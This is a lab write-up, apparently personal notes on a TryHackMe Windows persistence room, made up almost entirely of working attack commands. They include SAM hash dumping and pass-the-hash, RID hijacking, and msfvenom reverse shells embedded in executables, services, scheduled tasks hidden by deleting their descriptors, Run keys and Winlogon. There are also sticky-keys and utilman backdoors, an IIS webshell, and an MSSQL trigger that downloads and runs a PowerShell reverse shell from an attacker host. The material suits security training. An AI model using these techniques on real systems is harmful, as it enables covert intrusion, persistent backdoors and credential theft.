+++
title = "Windows Local Persistence"
+++
# https://tryhackme.com/room/windowslocalpersistence

```bash
=================================
10.201.47.204 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.47.204' >> ~/.zshrc && source ~/.zshrc
echo "$TARGET HOSTNAME" | sudo tee -a /etc/hosts

xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /v:$TARGET /u:Administrator /p:'Password321' /drive:'/usr/share/windows-resources/mimikatz/x64',share

---

# Full admin account
net localgroup administrators thmuser0 /add

# Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL
# This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially
net localgroup "Backup Operators" thmuser1 /add

# REQUIRED: Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups
net localgroup "Remote Management Users" thmuser1 /add

---
### Assign Group Memberships

evil-winrm -i $TARGET -u thmuser1 -p Password321
// due to UACs LocalAccountTokenFilterPolicy, cannot escale to admin privs

// changes: Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
// to: Mandatory Label\High Mandatory Level Label            S-1-16-12288

# now we can download SAM and SYSTEM hives
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
// gettings those tasty hashes

Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
thmuser1:1008:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser2:1009:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser3:1010:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::

evil-winrm -u Administrator -H f3118544a831e728781d780cfdb9c1fa -i $TARGET

---
### Special Privileges and Security Descriptors
# https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants

# Backup Operators group, it has the following two privileges assigned by default:
# - SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
# - SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.

# Give user privilege
secedit /export /cfg config.inf
// add <USER> to 'SeBackupPrivilege' = USER1,SID2,<USER>
// add <USER> to 'SeRestorePrivilege' = USER1,SID2,<USER>
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
// check via "whoami /priv"

Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
// add <USER>
// Give Permission or Allow: "Full Control(All Operations)"

// changes: Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
// to: Mandatory Label\High Mandatory Level Label            S-1-16-12288
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy

evil-winrm -u thmuser2 -p Password321 -i $TARGET

---
### RID Hijacking
# In any Windows system, the default Administrator account is assigned the RID = 500
# and regular users usually have RID >= 1000.

wmic useraccount get name,sid
// look at the last ending digits group "...-500"
Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser0            S-1-5-21-1966530601-3185510712-10604624-1011
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
thmuser4            S-1-5-21-1966530601-3185510712-10604624-1013
WDAGUtilityAccount  S-1-5-21-1966530601-3185510712-10604624-504
// thmuser3 is 1010 or 0x03F2 or in Little Endian F203 (reverse)

# REQUIRES: SYSTEM (not Administrator) to modify SAM hive
cd C:\tools\pstools
.\PsExec64.exe -i -s regedit

# Go to: HKLM\SAM\SAM\Domains\Account\Users\
# Search for RID in Hexadecimal
// under Users, look for "000003F2" and look at the key "F"
// change F203 (RID but in LE) to F401 (LE) which = 0x01F4 = 500

xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /v:$TARGET /u:thmuser3 /p:'Password321' /drive:'/usr/share/windows-resources/mimikatz/x64',share
// logs into Administrator instead of thmuser3

---
### Backdooring Files

# Add backdoor to .exe (normally one that the Users runs or has a Desktop shortcut to)
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=<10.201.1.236> lport=<PORT> -b "\x00" -f exe -o puttyX.exe

# Shortcut backdoor (find shorcut)
@'
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.201.1.236 4445"
C:\Windows\System32\calc.exe
'@ | Out-File C:\Windows\System32\calc.ps1
// Change Target to:
// powershell.exe -WindowStyle hidden C:\Windows\System32\calc.ps1
// Change Icon: to normal icon

---
### Hijacking File Associations
# HKLM\Software\Classes and check "(Default)"
// for example, for .txt, it's "txtfile"
// HKLM\Software\Classes\txtfile\shell\open\command

@'
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.201.1.236 4448"; C:\Windows\system32\NOTEPAD.EXE $args[0]
'@ | Out-File C:\Windows\shortcut.ps1
// Change "(Default)" to:
// powershell.exe -WindowStyle hidden C:\Windows\shortcut.ps1 %1

---
### Abusing Services

# Creating Service
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.201.1.236 LPORT=4448 -f exe-service -o rev-svc.exe
// upload to C:\Windows\
sudo python3 -m http.server 8080
certutil.exe -urlcache -f http://10.201.1.236:8080/rev-svc.exe C:\Windows\rev-svc.exe

sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2

---
### Modifying Service
# Avoid service creation logs

sc.exe query state=all
# 3 Important Service Attributes for Persistence:
# - The executable (BINARY_PATH_NAME) should point to our payload.
# - The service START_TYPE should be automatic so that the payload runs without user interaction.
# - The SERVICE_START_NAME, which is the account under which the service will run, should preferably be set to LocalSystem to gain SYSTEM privileges.

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.201.1.236 LPORT=5558 -f exe-service -o rev-svc2.exe
// upload to C:\Windows\
sudo python3 -m http.server 8080
certutil.exe -urlcache -f http://10.201.1.236:8080/rev-svc2.exe C:\Windows\rev-svc2.exe
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"

sc.exe qc THMservice3
sc.exe start THMservice3

---
### Schedule Tasks
# https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks

schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.201.1.236 4449" /ru SYSTEM
schtasks /query /tn thm-taskbackdoor

# Hiding the Task via deleting Security Descriptor (SD)
# in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<SERVICE> Key: "SD"
c:\tools\pstools\PsExec64.exe -s -i regedit

# NOW:
schtasks /query /tn thm-taskbackdoor
// ERROR: The system cannot find the file specified. 

---
### Logon Triggers

# Startup Folder
# C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
# ALL: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.201.1.236 LPORT=4450 -f exe -o revshell.exe
sudo python3 -m http.server 8080
certutil.exe -urlcache -f http://10.201.1.236:8080/revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\revshell.exe"
// sign out of RDP Session, sign back in, and wait 1 moment

# Registry Run/RunOnce
# - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
# - HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
# - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
# - HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.201.1.236 LPORT=4451 -f exe -o revshell.exe
sudo python3 -m http.server 8080
certutil.exe -urlcache -f http://10.201.1.236:8080/revshell.exe "C:\Windows\revshell.exe"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyBackdoor" /t REG_EXPAND_SZ /d "C:\Windows\revshell.exe" /f
// sign out of RDP Session, sign back in, and wait 1 moment

# WinLogon
# HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.201.1.236 LPORT=4452 -f exe -o revshell.exe
sudo python3 -m http.server 8080
certutil.exe -urlcache -f http://10.201.1.236:8080/revshell.exe "C:\Windows\revshell.exe"
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe, C:\Windows\revshell.exe" /f
// sign out of RDP Session, sign back in, and wait 1 moment

# Logon scripts: UserInitMprLogonScript
# NOTE: each user has its own environment variables; therefore, you NEED to backdoor each separately
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.201.1.236 LPORT=4453 -f exe -o revshell.exe
sudo python3 -m http.server 8080
certutil.exe -urlcache -f http://10.201.1.236:8080/revshell.exe "C:\Windows\revshell.exe"
reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\Windows\revshell.exe" /f

---
### Backdooring (RDP) Login

# Sticky Keys
takeown /f c:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
copy /Y c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
// LOCK the user session
// Press SHIFT 5+ times

# Utilman (Ease of Access)
takeown /f c:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
copy /Y c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
// LOCK the user session
// Click Ease of Access Icon (cirle) on Logon Screen

---
### Existing Services

# IIS Server Backdoor
wget -O shell.aspx https://github.com/tennc/webshell/raw/refs/heads/master/fuzzdb-webshell/asp/cmdasp.aspx
sudo python3 -m http.server 8080
certutil.exe -urlcache -f http://10.201.1.236:8080/shell.aspx "C:\inetpub\wwwroot\shell.aspx"
icacls C:\inetpub\wwwroot\shell.aspx /grant Everyone:F

# http://10.201.47.204/shell.aspx
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw '__VIEWSTATE=%2FwEPDwULLTE2MjA0MDg4ODhkZGrPiIqBVnxsQNeTNwZ6e5JGf%2BFpIMK9JgImJ6OI4wEB&__VIEWSTATEGENERATOR=3C1A3EEC&__EVENTVALIDATION=%2FwEdAANhXtbpepdyItPcBM0qI8gpitssAmaVIY7AayhB9duwcnk2JDuMxrvKtMBUSvskgfGKwOihKJvY3HCukDeqZmrfsT0%2FrCFFke%2Bj4ACv5lGO0w%3D%3D&txtArg=whoami&testing=execute' 'http://10.201.47.204/shell.aspx'

# MSSQL Backdoor

# NOTE: must enable: xp_cmdshell
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO
sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
# Allow any website accessing DB to run commands
USE master
GRANT IMPERSONATE ON LOGIN::sa to [Public];
USE HRDB
# Every time a user is created (inserted into the table)
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS
EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://10.201.1.236:8000/evilscript.ps1'')"';

# Powershell script "evilscript.ps1"
# nc -lvnp 4454
$client = New-Object System.Net.Sockets.TCPClient("10.201.1.236",4454);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()

// add user to database!
```
